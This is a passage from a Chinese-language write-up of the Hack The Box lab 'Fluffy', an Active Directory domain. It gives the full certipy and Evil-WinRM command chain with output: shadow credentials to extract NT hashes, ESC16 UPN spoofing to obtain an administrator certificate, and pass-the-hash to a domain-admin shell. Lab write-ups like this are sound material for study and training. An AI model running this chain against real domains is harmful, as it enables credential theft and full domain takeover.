msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE

distinguishedName: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
classStore: CREATE_CHILD
memberUid: WRITE
gidNumber: WRITE
msSFU30PosixMember: WRITE
msSFU30NisDomain: WRITE
msSFU30Name: WRITE
labeledURI: WRITE
secretary: WRITE
mail: WRITE
textEncodedORAddress: WRITE
userSMIMECertificate: WRITE
msDS-preferredDataLocation: WRITE
msDS-ObjectSoa: WRITE
msDS-SourceAnchor: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-CloudAnchor: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-PrimaryComputer: WRITE
msDS-LastKnownRDN: WRITE
isRecycled: WRITE
msDS-NcType: WRITE
msDS-AzGenericData: WRITE
msDS-AzObjectGuid: WRITE
msDS-PhoneticDisplayName: WRITE
unixUserPassword: WRITE
msDS-AzApplicationData: WRITE
msDS-AzLastImportedBizRulePath: WRITE
msDS-AzBizRuleLanguage: WRITE
msDS-AzBizRule: WRITE
msDS-NonMembers: WRITE
msDS-AzLDAPQuery: WRITE
mS-DS-ConsistencyChildCount: WRITE
mS-DS-ConsistencyGuid: WRITE
otherWellKnownObjects: WRITE
dSCorePropagationData: WRITE
accountNameHistory: WRITE
proxiedObjectName: WRITE
uSNSource: WRITE
isCriticalSystemObject: WRITE
altSecurityIdentities: WRITE
lastKnownParent: WRITE
url: WRITE
partialAttributeDeletionList: WRITE
legacyExchangeDN: WRITE
managedBy: WRITE
userCert: WRITE
showInAddressBook: WRITE
partialAttributeSet: WRITE
wellKnownObjects: WRITE
sIDHistory: WRITE
nonSecurityMember: WRITE
systemFlags: WRITE
fSMORoleOwner: WRITE
desktopProfile: WRITE
sAMAccountType: WRITE
wbemPath: WRITE
controlAccessRights: WRITE
groupMembershipSAM: WRITE
rid: WRITE
groupAttributes: WRITE
adminCount: WRITE
revision: WRITE
operatorCount: WRITE
supplementalCredentials: WRITE
securityIdentifier: WRITE
nTGroupMembers: WRITE
flags: WRITE
replUpToDateVector: WRITE
replPropertyMetaData: WRITE
objectGUID: WRITE
name: WRITE
msExchLabeledURI: WRITE
USNIntersite: WRITE
wWWHomePage: WRITE
msExchAssistantName: WRITE
displayNamePrintable: WRITE
garbageCollPeriod: WRITE
uSNDSALastObjRemoved: WRITE
extensionName: WRITE
adminDescription: WRITE
proxyAddresses: WRITE
adminDisplayName: WRITE
showInAdvancedViewOnly: WRITE
uSNLastObjRem: WRITE
uSNChanged: WRITE
repsFrom: WRITE
repsTo: WRITE
info: WRITE
objectVersion: WRITE
dSASignature: WRITE
isDeleted: WRITE
uSNCreated: WRITE
displayName: WRITE
subRefs: WRITE
whenChanged: WRITE
whenCreated: WRITE
dn: WRITE
userCertificate: WRITE
userPassword: WRITE
member: WRITE
telephoneNumber: WRITE
description: WRITE
objectCategory: WRITE
groupType: WRITE
sAMAccountName: WRITE
objectSid: WRITE
nTSecurityDescriptor: WRITE
instanceType: WRITE
cn: WRITE
objectClass: WRITE
OWNER: WRITE
DACL: WRITE
```

### 获取ca_svc用户 NTLM hash

听名字很像证书管理者，伪造证书很方便

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'ca_svc' -target dc01.fluffy.htb -dc-ip 10.10.11.69
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '65515a42-b8d1-490d-ffbc-b04e355cfdea'
[*] Adding Key Credential with device ID '65515a42-b8d1-490d-ffbc-b04e355cfdea' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '65515a42-b8d1-490d-ffbc-b04e355cfdea' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

读取 `ca_svc` 账户自身的属性验证一下

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -user 'ca_svc' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-07-18T00:20:12+00:00
```

### 获取winrm_svc用户 NTLM hash

这个用户名字听起来就是很winrm登录

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'winrm_svc' -target dc01.fluffy.htb -dc-ip 10.10.11.69
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'bd89a834-5b16-e522-e868-ecf3c39ad6e7'
[*] Adding Key Credential with device ID 'bd89a834-5b16-e522-e868-ecf3c39ad6e7' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'bd89a834-5b16-e522-e868-ecf3c39ad6e7' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

### winrm登录

```bash
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ..
*Evil-WinRM* PS C:\Users\winrm_svc> ls


    Directory: C:\Users\winrm_svc


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/17/2025  11:56 AM                Desktop
d-r---        5/19/2025   9:15 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos

*Evil-WinRM* PS C:\Users\winrm_svc> ls Downloads
*Evil-WinRM* PS C:\Users\winrm_svc> ls Links
*Evil-WinRM* PS C:\Users\winrm_svc> ls Desktop


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/17/2025  11:12 AM             34 user.txt
```

用户flag在user.txt里，cat一下就可以了

## CA提权

使用 Certipy 工具对 AD 证书服务进行枚举，查找易受攻击的证书模板：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# certipy-ad find -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target DC01.fluffy.htb -text -stdout -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

### ESC16

[ESC16: Security Extension Disabled on CA (Globally)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-07-18T00:20:12+00:00
```

将 ca_svc 账户的 UPN（User Principal Name） 修改为administrator，如果成功，可通过 UPN 劫持 伪造管理员身份

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69'  -upn 'administrator'  -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

时间隔得长了时间不同步，这中间动不动要时间同步一下，否则每次会获取hash会失败

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '88a0eef0-700b-1437-13e1-1d50f4f8e893'
[*] Adding Key Credential with device ID '88a0eef0-700b-1437-13e1-1d50f4f8e893' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '88a0eef0-700b-1437-13e1-1d50f4f8e893' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
File 'ca_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

指定 `Kerberos` 票据缓存文件的位置，避免重复认证，票据传递攻击

```bash
export KRB5CCNAME=ca_svc.ccache
```

请求获取基于 `User` 模板的证书关联到`administrator` 账户

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# certipy-ad req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 28
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

修改服务账户` ca_svc `的用户主体名称 (`UPN`)，将其更新为 `ca_svc@fluffy.htb`

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

获取域管理员`administrator`的`NT`哈希：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# evil-winrm -i 10.10.11.69 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e    

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                    

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                               

Info: Establishing connection to remote endpoint                          
*Evil-WinRM* PS C:\Users\Administrato
*Evil-WinRM* PS C:\Users\Administrato
r\Documents> 
```

查看自己是不是域控
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/f4acb8820d234b0180d679c5a87bddbb.png)
终于啊啊啊啊啊啊啊啊啊啊啊啊啊
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e412748f84d740e29d367ed4c11ab11f.png)

# WP

[HTB-Fluffy](https://www.hyhforever.top/posts/2025/05/htb-fluffy/)
[HTB 第八赛季fluffy靶机：从SMB到域控](https://mp.weixin.qq.com/s/1fpNGQjhn_IZcMkv17ddEg)
[靶机学习 Fluffy-先知社区](https://xz.aliyun.com/news/18153)
[外国人的英文wp](https://dudenation.github.io/posts/fluffy-htb-season8/)
